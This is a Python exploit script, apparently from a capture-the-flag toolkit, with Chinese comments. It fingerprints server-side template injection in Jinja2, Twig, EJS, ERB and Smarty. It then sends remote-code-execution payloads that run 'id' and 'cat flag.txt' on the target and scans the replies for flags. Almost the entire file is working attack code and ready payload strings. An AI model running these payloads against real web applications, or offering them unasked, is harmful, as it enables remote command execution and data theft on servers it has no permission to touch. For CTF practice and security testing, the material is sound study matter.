#!/usr/bin/env python3
"""SSTI 服务端模板注入利用：探测 + 常见表达式执行。

用法：
    python3 arsenal/payloads/ssti_probe.py --url 'http://host/greet?name=' --param name
    python3 arsenal/payloads/ssti_probe.py --url 'http://host/greet' --method POST --data 'name=x' --param name

成功：输出表达式计算结果或 flag 候选；失败：输出响应差异。
"""
import argparse
import re
import requests
import sys


PROBES = [
    # Jinja2
    ("{{7*7}}", "49", "jinja2"),
    ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", None, "jinja2"),
    # Twig
    ("{{7*7}}", "49", "twig"),
    ("{{['id']|filter('system')}}", None, "twig"),
    # EJS / node
    ("<%= 7*7 %>", "49", "ejs"),
    ("<%= require('child_process').execSync('id').toString() %>", None, "ejs"),
    # Ruby ERB
    ("<%= 7*7 %>", "49", "erb"),
    ("<%= %x[id] %>", None, "erb"),
    # Smarty
    ("{7*7}", "49", "smarty"),
    ("{system('id')}", None, "smarty"),
]


def _probe(url, method, headers, data, param, payload, timeout=15):
    d = (data or "").copy() if data else {}
    if param in d:
        d[param] = payload
    kwargs = {"url": url, "method": method, "headers": headers or {}, "timeout": timeout, "verify": False}
    if method.upper() == "GET":
        kwargs["params"] = {param: payload}
        kwargs["data"] = None
    else:
        kwargs["data"] = d or {param: payload}
    try:
        r = requests.request(**kwargs)
        return r.status_code, len(r.content), r.text
    except Exception as e:
        return -1, 0, str(e)


def main():
    parser = argparse.ArgumentParser(description="SSTI 探测利用脚本")
    parser.add_argument("--url", required=True)
    parser.add_argument("--param", required=True)
    parser.add_argument("--method", default="GET", choices=["GET", "POST"])
    parser.add_argument("--data", default="")
    parser.add_argument("--headers", default="", help="JSON 字符串")
    parser.add_argument("--timeout", type=int, default=15)
    args = parser.parse_args()

    import json
    headers = json.loads(args.headers) if args.headers else {}
    data = {k: v for k, v in (p.split("=", 1) for p in args.data.split("&") if p)} if args.data else {}

    base_status, base_len, base_text = _probe(args.url, args.method, headers, data, args.param, "BASELINE", args.timeout)
    print(f"[base] status={base_len} len={base_len}")

    engine = None
    for payload, expected, family in PROBES:
        status, length, text = _probe(args.url, args.method, headers, data, args.param, payload, args.timeout)
        hit = expected and expected in text
        print(f"[try] {family:8} {payload!r:55} status={status} len={length} hit={hit}")
        if hit:
            engine = family
            break

    if not engine:
        print("[verdict] 未发现常见 SSTI 特征")
        return 1

    # 尝试 RCE
    rce_payloads = {
        "jinja2": "{{config.__class__.__init__.__globals__['os'].popen('id;cat flag.txt;cat flag').read()}}",
        "twig": "{{['id;cat flag.txt']|filter('system')}}",
        "ejs": "<%= require('child_process').execSync('id;cat flag.txt').toString() %>",
        "erb": "<%= %x[id;cat flag.txt] %>",
        "smarty": "{system('id;cat flag.txt')}",
    }
    rce = rce_payloads.get(engine, "")
    if rce:
        _, _, rce_text = _probe(args.url, args.method, headers, data, args.param, rce, args.timeout)
        print(f"[rce]\n{rce_text[:2000]}")
        flags = re.findall(r'flag\{[^}]+\}|FLAG_[A-Z0-9_]+|TSCT?\{[^}]+\}', rce_text, re.I)
        if flags:
            print(f"[flag_candidates] {flags}")
            return 0
    return 1


if __name__ == "__main__":
    sys.exit(main())
